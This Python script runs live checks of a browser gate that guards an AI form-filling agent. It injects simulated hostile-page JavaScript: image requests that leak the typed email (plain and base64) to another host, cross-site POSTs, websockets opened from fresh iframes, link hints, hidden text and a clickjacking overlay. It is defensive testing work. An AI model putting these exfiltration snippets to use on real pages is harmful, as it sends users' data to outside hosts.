"""The browser's gate, the action's question and the live view on a real Steel session, against
public pages (httpbin.org's form, a font from Google's, an image, a websocket and a frame of
other sites, the page's own scripts doing what a hostile page would).

    ~/sandy_app_venv/bin/python scripts/steel_live_check.py            # gate, real click, live view
    ~/sandy_app_venv/bin/python scripts/steel_live_check.py --fill     # and a whole fill, real model

Needs `STEEL_API_KEY` in `.env` (and the chat model's settings for `--fill`). It costs a few cents
of Steel time and, with `--fill`, a few model calls. It prints what each check found and never
the key or an address that carries it. Every session it opens is released.
"""
from __future__ import annotations

import argparse
import asyncio
import json
import os
import re
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "cloud"))

FORM = "https://httpbin.org/forms/post"
EMAIL = "sandy.test.4417@example.com"
FILL_JS = """(() => { const f = document.forms[0];
  f.custname.value = "Sandy Test"; f.custtel.value = "000"; f.custemail.value = "%s";
  return true; })()""" % EMAIL
ANSWERED_JS = "document.body.innerText.includes('Sandy Test') && location.pathname === '/post'"
FONT_JS = """new FontFace("Live", "url(https://fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Mu4mxK.woff2)")
  .load().then(() => "loaded").catch((e) => "failed")"""
STYLE_JS = """new Promise((done) => { const l = document.createElement("link"); l.rel = "stylesheet";
  l.href = "https://fonts.googleapis.com/css2?family=Roboto"; l.onload = () => done("loaded");
  l.onerror = () => done("failed"); document.head.appendChild(l); })"""
LEAK_JS = """new Promise((done) => { const i = new Image(); i.onload = () => done("loaded");
  i.onerror = () => done("failed"); i.src = "https://www.google.com/favicon.ico?e=" + encodeURIComponent("%s"); })""" % EMAIL
# The same value in base64, as a page would hide it.
LEAK_B64_JS = LEAK_JS.replace('encodeURIComponent("%s")' % EMAIL, 'btoa("%s")' % EMAIL)
SOCKET_JS = """new Promise((done) => { let s; try { s = new WebSocket("wss://ws.postman-echo.com/raw"); }
  catch (e) { return done("refused"); }
  s.onopen = () => { s.send("x"); done("open"); }; s.onerror = () => done("failed");
  setTimeout(() => done("state " + s.readyState), 6000); })"""
# The same, from a fresh frame of its own (a way round a page's own scripts).
SOCKET_FRAME_JS = SOCKET_JS.replace("new WebSocket(", "new (document.body.appendChild(document.createElement("
                                    "'iframe')).contentWindow.WebSocket)(")
FRAME = "https://httpbingo.org/forms/post"
FRAME_JS = """new Promise((done) => { const f = document.createElement("iframe"); f.src = "%s";
  document.body.appendChild(f); setTimeout(() => done(true), 5000); })""" % FRAME
POST_OTHER_JS = """fetch("https://httpbingo.org/post", {method: "POST", body: "x=1", mode: "no-cors"})
  .then(() => "sent").catch(() => "blocked")"""
BUTTON_JS = "document.querySelector('form button')"
# Hidden only as drawn: rules put in by script (the markup shows an empty style), off the page,
# white on white, of no size, inside a transparent box; and words that are shown.
HIDE_JS = """(() => { const st = document.createElement("style"); document.head.appendChild(st);
  st.sheet.insertRule(".gone { position: absolute; left: -5000px }"); st.sheet.insertRule(".pale { color: #fefefe }");
  document.body.insertAdjacentHTML("beforeend", "<p class='gone'>HIDDEN-A</p><p class='pale'>HIDDEN-B</p>"
    + "<p style='font-size:0'>HIDDEN-C</p><div style='opacity:0'><p>HIDDEN-D</p></div><p>SHOWN-E</p>");
  return true; })()"""


def report(name: str, ok: bool, detail: str = "") -> bool:
    print(f"{'PASS' if ok else 'FAIL'}  {name}{'  — ' + detail if detail else ''}")
    return ok


async def _fresh(session_id: str):
    from app.brain import browser_gate
    from app.integrations import browser_cdp, steel_client
    client = await browser_cdp.connect(steel_client.connect_url(session_id))
    gate = browser_gate.Gate("httpbin.org")
    gate.acted("type", EMAIL)
    gate.last = None
    await browser_gate.install(client, gate)
    tab = await browser_cdp.first_page(client)
    await browser_cdp.goto(client, tab, FORM)
    return client, gate, tab


async def gate_checks(session_id: str) -> list:
    from app.brain import browser_gate
    from app.features import browser_job
    from app.integrations import browser_cdp
    results = []
    client, gate, tab = await _fresh(session_id)
    try:
        results.append(report("the form page opens behind the gate",
                              "forms/post" in await browser_cdp.where(client, tab)))
        from app.features import web_page
        await browser_cdp.evaluate(client, tab, HIDE_JS)
        plain = web_page.extract(await browser_cdp.html(client, tab), FORM)
        drawn = web_page.extract(await browser_cdp.evaluate(client, tab, web_page.MARK_HIDDEN_JS), FORM)
        results.append(report("what the browser draws hidden is never read", "SHOWN-E" in drawn["text"]
                              and "HIDDEN" not in drawn["text"],
                              f"hidden by its markup alone: {sorted(set(re.findall('HIDDEN-.', plain['hidden'])))}"))
        await browser_cdp.goto(client, tab, FORM)
        # 1. A script's own submit, nothing approved: blocked, never answered.
        await browser_cdp.evaluate(client, tab, FILL_JS)
        await browser_cdp.evaluate(client, tab, "document.forms[0].submit(); true")
        await asyncio.sleep(3)
        answered = await browser_cdp.evaluate(client, tab, ANSWERED_JS)
        results.append(report("a script's form submit does not leave", not answered and not gate.sent
                              and gate.breach is None, f"blocked {len(gate.blocked)}"))

        # 2. A font and a style from another site load: the page works.
        await browser_cdp.goto(client, tab, FORM)
        font, style = await browser_cdp.evaluate(client, tab, FONT_JS), await browser_cdp.evaluate(client, tab, STYLE_JS)
        results.append(report("a font and a style from another site load", font == "loaded" and style == "loaded"
                              and gate.breach is None, f"font {font}, style {style}"))

        # 3. A send to another site with nothing of his in it: blocked, the fill goes on.
        posted = await browser_cdp.evaluate(client, tab, POST_OTHER_JS)
        results.append(report("a send to another site is blocked", posted == "blocked" and gate.breach is None,
                              str(posted)))

        # 4. A frame of another site (a form in it): never loads.
        await browser_cdp.evaluate(client, tab, FRAME_JS)
        framed = [u for m, u in gate.blocked if u.startswith(FRAME)]
        results.append(report("a frame of another site never loads", bool(framed) and gate.breach is None,
                              f"blocked {framed[:1]}"))

        # 5. A websocket: never opens; one made anyway stops the fill.
        sock = await browser_cdp.evaluate(client, tab, SOCKET_JS)
        results.append(report("a websocket never opens", sock != "open", f"{sock}, gate {gate.breach}"))
        sock = await browser_cdp.evaluate(client, tab, SOCKET_FRAME_JS)
        results.append(report("nor one from a fresh frame", sock != "open", f"{sock}, gate {gate.breach}"))
    finally:
        await client.stop()

    # 6. An image to another site carrying what she typed: blocked and the fill stopped.
    client, gate, tab = await _fresh(session_id)
    try:
        leaked = await browser_cdp.evaluate(client, tab, LEAK_JS)
        results.append(report("an image carrying what she typed is stopped", leaked == "failed"
                              and gate.breach == browser_gate.LEAK, f"{leaked}, gate {gate.breach}"))
    finally:
        await client.stop()
    client, gate, tab = await _fresh(session_id)
    try:
        leaked = await browser_cdp.evaluate(client, tab, LEAK_B64_JS)
        results.append(report("and one carrying it in base64", leaked == "failed"
                              and gate.breach == browser_gate.LEAK, f"{leaked}, gate {gate.breach}"))
    finally:
        await client.stop()

    # 7. The send button, unasked: blocked; with his yes, the real click on it sends once.
    client, gate, tab = await _fresh(session_id)
    try:
        await browser_cdp.evaluate(client, tab, FILL_JS)
        found = await client.send.Runtime.evaluate(params={"expression": BUTTON_JS}, session_id=tab)
        node = (await client.send.DOM.describeNode(params={"objectId": found["result"]["objectId"]},
                                                   session_id=tab))["node"]["backendNodeId"]
        target = next(t["targetId"] for t in (await client.send.Target.getTargets())["targetInfos"]
                      if t.get("type") == "page")
        row = {"_id": "live", "site": "httpbin.org"}
        out = await browser_job._act(row, gate, client, gate.sessions[target],
                                     {"kind": "click", "target": target, "node": node, "label": "submit"})
        answered = await browser_cdp.evaluate(client, tab, ANSWERED_JS)
        results.append(report("his yes is the real click on the same page, sent once",
                              out.get("status") == browser_job.DONE and bool(answered) and len(gate.sent) == 1,
                              f"{out.get('status')} {out.get('reason', '')} sent {len(gate.sent)}"))
        # A script's send after his yes, nothing reset: the gate shut behind the one send.
        await browser_cdp.goto(client, tab, FORM)
        await browser_cdp.evaluate(client, tab, FILL_JS)
        before = len(gate.sent)
        await browser_cdp.evaluate(client, tab, "document.forms[0].submit(); true")
        await asyncio.sleep(3)
        results.append(report("a second send is not let through", len(gate.sent) == before
                              and not await browser_cdp.evaluate(client, tab, ANSWERED_JS)))

        # 9. Once she typed, a read a click makes (a link with its query) is held, kept paused (the
        # page frozen meanwhile); his yes lets that very request go, twenty seconds later; on a
        # fill-only site it is answered with nothing and the page stays as it was.
        for fill_only in (True, False):
            await browser_cdp.goto(client, tab, FORM)
            await browser_cdp.evaluate(client, tab, FILL_JS)
            gate.acted("type", "Sandy Test")
            gate.acted("click")
            await browser_cdp.evaluate(client, tab, "location.href = '/get?name=Sandy+Test'; true")
            await asyncio.sleep(20 if not fill_only else 3)
            paused = dict(gate.paused or {})
            results.append(report("a read a click made once she typed is held", "/get?name=" in paused.get("url", "")))
            if fill_only:
                await browser_job._nothing(client, gate.drop_paused())
                await asyncio.sleep(1)
                kept = await browser_cdp.evaluate(client, tab, "location.pathname + ' ' + document.forms[0].custname.value")
                results.append(report("on a fill-only site it goes nowhere and the page stays, filled",
                                      kept == "/forms/post Sandy Test", str(kept)))
            else:
                out = await browser_job._act(row, gate, client, paused.get("session") or tab,
                                             {"kind": "request", "label": "get"})
                now = await browser_cdp.where(client, tab)
                results.append(report("his yes lets that very request go", out.get("status") == browser_job.DONE
                                      and "/get?name=" in now, f"{out.get('status')} {out.get('reason', '')} {now[-20:]}"))
            gate.last = None

        # 8. A tab opened later: the gate is on it before it loads.
        before = len(gate.sent)
        await browser_cdp.evaluate(client, tab, "window.open('" + FORM + "', '_blank'); true")
        await asyncio.sleep(5)
        other = [s for t, s in gate.sessions.items() if t != target]
        if other:
            await browser_cdp.settle(client, other[0], 15)
            await browser_cdp.evaluate(client, other[0], FILL_JS)
            await browser_cdp.evaluate(client, other[0], "document.forms[0].submit(); true")
            await asyncio.sleep(3)
            results.append(report("a new tab's send is blocked too", len(gate.sent) == before
                                  and not await browser_cdp.evaluate(client, other[0], ANSWERED_JS)))
        else:
            results.append(report("a new tab's send is blocked too", False, "no new tab was covered"))
    finally:
        await client.stop()
    return results


# A frame of the site's own, lower down the page, with the form in it.
OWN_FRAME_JS = """new Promise((done) => { const f = document.createElement("iframe"); f.src = "/forms/post";
  f.style = "margin-top: 500px; width: 600px; height: 700px; border: 0"; f.id = "own";
  f.onload = () => { const d = f.contentDocument; d.forms[0].custname.value = "Sandy Test";
    d.forms[0].custtel.value = "000"; d.forms[0].custemail.value = "%s"; done(true); };
  document.body.appendChild(f); })""" % EMAIL
FRAME_BUTTON_JS = "document.getElementById('own').contentDocument.querySelector('form button')"
COVER_JS = """(() => {
  const c = document.createElement("div"); c.style = `position: fixed; left: 0; top: 0; width: 100vw;
  height: 100vh; z-index: 9; background: transparent`; document.body.appendChild(c); return true; })()"""
FRAME_ANSWERED_JS = "document.getElementById('own').contentWindow.location.pathname"


async def frame_checks(session_id: str) -> list:
    """His yes on a button inside a frame of the site's own: it lands there, and never when
    something else lies over it."""
    from app.features import browser_job
    from app.integrations import browser_cdp
    results = []
    for covered in (True, False):
        client, gate, tab = await _fresh(session_id)
        try:
            await browser_cdp.evaluate(client, tab, OWN_FRAME_JS)
            if covered:
                await browser_cdp.evaluate(client, tab, COVER_JS)
            found = await client.send.Runtime.evaluate(params={"expression": FRAME_BUTTON_JS}, session_id=tab)
            node = (await client.send.DOM.describeNode(params={"objectId": found["result"]["objectId"]},
                                                       session_id=tab))["node"]["backendNodeId"]
            # On the gate's own session of the tab, as a fill does (`_hold`).
            target = next(t["targetId"] for t in (await client.send.Target.getTargets())["targetInfos"]
                          if t.get("type") == "page")
            out = await browser_job._act({"_id": "live", "site": "httpbin.org"}, gate, client, gate.sessions[target],
                                         {"kind": "click", "node": node, "label": "submit"})
            where = await browser_cdp.evaluate(client, tab, FRAME_ANSWERED_JS)
            if covered:
                results.append(report("a button in a frame with something over it is never clicked",
                                      out.get("reason") == "moved" and not gate.sent, f"{out}"))
            else:
                results.append(report("his yes on a button inside a frame of the site lands there",
                                      out.get("status") == browser_job.DONE and where == "/post"
                                      and len(gate.sent) == 1, f"{out.get('status')} {out.get('reason', '')} {where}"))
        finally:
            await client.stop()
    return results


# Every way a script puts a hint to open a name or a connection to another host into the page.
HINT_WAYS = {
    "appended": "const l = document.createElement('link'); l.rel = 'preconnect'; l.href = 'https://x1.example.net'; "
                "document.head.appendChild(l)",
    "written as markup": "document.body.insertAdjacentHTML('beforeend', '<link rel=dns-prefetch href=//x2.example.net>'); "
                         "document.body.innerHTML += '<link rel=preconnect href=https://x3.example.net>'",
    "its rel changed in place": "const l = document.createElement('link'); l.href = 'https://x4.example.net'; "
                                "document.head.appendChild(l); l.setAttribute('rel', 'preconnect'); "
                                "l.relList.add('dns-prefetch'); l.attributes.rel && (l.attributes.rel.value = 'preconnect')",
    "its href changed in place": "const l = document.createElement('link'); l.rel = 'preconnect'; l.href = '/own'; "
                                 "document.head.appendChild(l); l.href = 'https://x5.example.net'",
    "from a fresh frame": "const f = document.body.appendChild(document.createElement('iframe')); "
                          "f.contentDocument.head.innerHTML = '<link rel=preconnect href=https://x6.example.net>'",
}
HINTS_LEFT_JS = """(() => { const docs = [document, ...[...document.querySelectorAll("iframe")].map((f) => {
  try { return f.contentDocument; } catch (e) { return null; } }).filter(Boolean)];
  return docs.flatMap((d) => [...d.querySelectorAll("link")]).filter((l) =>
    /(dns-prefetch|preconnect)/i.test(l.getAttribute("rel") || "") && l.href
    && new URL(l.href).hostname !== location.hostname).map((l) => l.href); })()"""


async def hint_checks(session_id: str) -> list:
    from app.integrations import browser_cdp
    left = {}
    client, gate, tab = await _fresh(session_id)
    try:
        for name, js in HINT_WAYS.items():
            await browser_cdp.evaluate(client, tab, "(() => { " + js + "; return true; })()")
            left[name] = await browser_cdp.evaluate(client, tab, HINTS_LEFT_JS)
        await browser_cdp.evaluate(client, tab, "(() => { const l = document.createElement('link'); "
                                   "l.rel = 'preconnect'; l.href = location.origin + '/x'; "
                                   "document.head.appendChild(l); return true; })()")
        own = await browser_cdp.evaluate(client, tab, "document.querySelectorAll(\"link[rel=preconnect][href$='/x']\").length")
    finally:
        await client.stop()
    return [report("no hint to another host gets into a page, " + name, found == [], str(found))
            for name, found in left.items()] + [report("a hint to the page's own host stays", own == 1, str(own))]


def live_view(debug_url: str) -> bool:
    import requests
    if not debug_url:
        return report("the live view opens", False, "Steel gave no view")
    joiner = "&" if "?" in debug_url else "?"
    resp = requests.get(f"{debug_url}{joiner}interactive=false&showControls=false", timeout=20)
    return report("the live view opens", resp.status_code == 200 and "html" in resp.headers.get("content-type", ""),
                  f"HTTP {resp.status_code}")


def _world():
    import mongomock

    from app import db as appdb
    from app.blocks import init_blocks
    os.environ["SANDY_FLAGS"] = json.dumps({"browser": ["live"]})
    d = mongomock.MongoClient().db
    appdb.configure(d)
    init_blocks(d)
    d["sandy_users"].insert_one({"_id": "live"})
    return {"chat_id": "live", "relation": "user", "permissions": "all"}


def _status(session_id: str) -> str:
    import requests

    from app import config
    resp = requests.get(f"https://api.steel.dev/v1/sessions/{session_id}", timeout=20,
                        headers={"steel-api-key": config.STEEL_API_KEY})
    return str((resp.json() if resp.ok else {}).get("status") or resp.status_code)


def leaking_fill() -> list:
    """A whole fill on a page that leaks what she typed: stopped, its Steel session closed before
    the gate comes off, told."""
    from app.brain import tools
    from app.brain.ctx import TurnCtx
    from app.features import browser_job, browser_sites
    from app.integrations import browser_cdp
    from app.utils.user_profiles import active_user_profile_context

    async def leaks(row, gate, client, tab, user_id, asked):
        gate.acted("type", EMAIL)
        await browser_cdp.evaluate(client, tab, LEAK_JS)
        await asyncio.sleep(10)
        return {"status": browser_job.DONE, "result": "the page leaked and nothing stopped it"}
    from app.integrations import steel_client
    order, connect, release = [], browser_cdp.connect, steel_client.release

    async def watched(url):
        client = await connect(url)
        stop = client.stop

        async def stopped():
            # The gate comes off here: Steel must say the session is closed by now.
            order.append(("gate off", steel_client.closed(job_id[0])))
            await stop()
        client.stop = stopped
        return client

    def releasing(sid, seconds=0):
        job_id[:] = [sid]
        done = release(sid, seconds)
        order.append(("released", done))
        return done
    job_id = [""]
    real, browser_job.AGENT = browser_job.AGENT, leaks
    browser_cdp.connect, steel_client.release = watched, releasing
    try:
        with active_user_profile_context(_world()):
            browser_sites.set_level("httpbin.org", browser_sites.SUBMIT)
            out = tools.execute("page_fill", {"url": FORM, "goal": "order", "details": f"email: {EMAIL}"},
                                TurnCtx(user_id="live", thread_id="t1"))
            row = (browser_job.open_jobs() or [{}])[0]
            from app.db import get_db
            job = get_db()[browser_job.COLLECTION].find_one({}) or {}
    finally:
        browser_job.AGENT = real
        browser_cdp.connect, steel_client.release = connect, release
    status = _status(job.get("steel_id", ""))
    first = report("a page that leaks stops the whole fill and closes its session",
                   out.get("ok") is False and job.get("reason") == "leak" and status == "released" and not row,
                   f"{job.get('status')} {job.get('reason')}, Steel {status}: {(out.get('reply') or '')[:80]}")
    return [first, report("Steel closed it before the gate came off", order[:1] == [("released", True)]
                            and order[-1:] == [("gate off", True)], str(order))]


def whole_fill() -> bool:
    """A whole fill through `page_fill` on the real model and Steel: asked before the click, then
    the real click on his yes."""
    from app.brain import tools
    from app.brain.ctx import TurnCtx
    from app.features import browser_job, browser_sites
    from app.utils.user_profiles import active_user_profile_context

    # A whole fill takes about eighty seconds, the tool's own wait: waited longer here, so the
    # check reads its question rather than its going on in the background.
    browser_job.WAIT_S = 240
    with active_user_profile_context(_world()):
        browser_sites.set_level("httpbin.org", browser_sites.SUBMIT)
        began = time.monotonic()
        asked = tools.execute("page_fill", {"url": FORM, "goal": "order a small pizza for pickup",
                                            "details": f"Name: Sandy Test, phone: 000, email: {EMAIL}"},
                              TurnCtx(user_id="live", thread_id="t1"))
        print(f"      fill took {time.monotonic() - began:.0f}s: {json.dumps({k: asked.get(k) for k in ('ok', 'needs_confirmation')})}")
        if not asked.get("needs_confirmation"):
            print(f"      answer: {asked.get('reply') or asked.get('error')}")
            return report("a whole fill asks before its click", False)
        report("a whole fill asks before its click", True, asked["summary"][:120])
        ctx = TurnCtx(user_id="live", thread_id="t1")
        ctx.confirmed, ctx.held_ids = True, asked["ids"]
        sent = tools.execute("page_fill", {}, ctx)
        row = browser_job.get(asked["ids"][0]) or {}
        return report("his yes clicks it and it is sent", sent.get("ok") is True and row.get("status") == browser_job.DONE
                      and '"args"' in (row.get("result") or ""),
                      (sent.get("reply") or "")[:120])


def main() -> int:
    from dotenv import load_dotenv
    load_dotenv(ROOT / ".env", override=True)
    parser = argparse.ArgumentParser()
    parser.add_argument("--fill", action="store_true")
    args = parser.parse_args()

    from app.bootstrap import configure_logging
    from app.integrations import steel_client
    configure_logging("WARNING")
    from app.integrations import browser_cdp
    # This check opens a dozen connections in a row; Steel was slow to open them on 3 Nov 2026.
    browser_cdp.CONNECT_TRIES = 6
    if not steel_client.configured():
        print("no STEEL_API_KEY")
        return 2
    results = []
    session = steel_client.create_session()
    began = time.monotonic()
    try:
        results += asyncio.run(gate_checks(session["id"]))
        results += asyncio.run(frame_checks(session["id"]))
        results += asyncio.run(hint_checks(session["id"]))
        results.append(live_view(session["debug_url"]))
    finally:
        steel_client.release(session["id"], time.monotonic() - began)
    results += leaking_fill()
    if args.fill:
        results.append(whole_fill())
    print(f"\n{sum(results)}/{len(results)} passed")
    return 0 if all(results) else 1


if __name__ == "__main__":
    sys.exit(main())
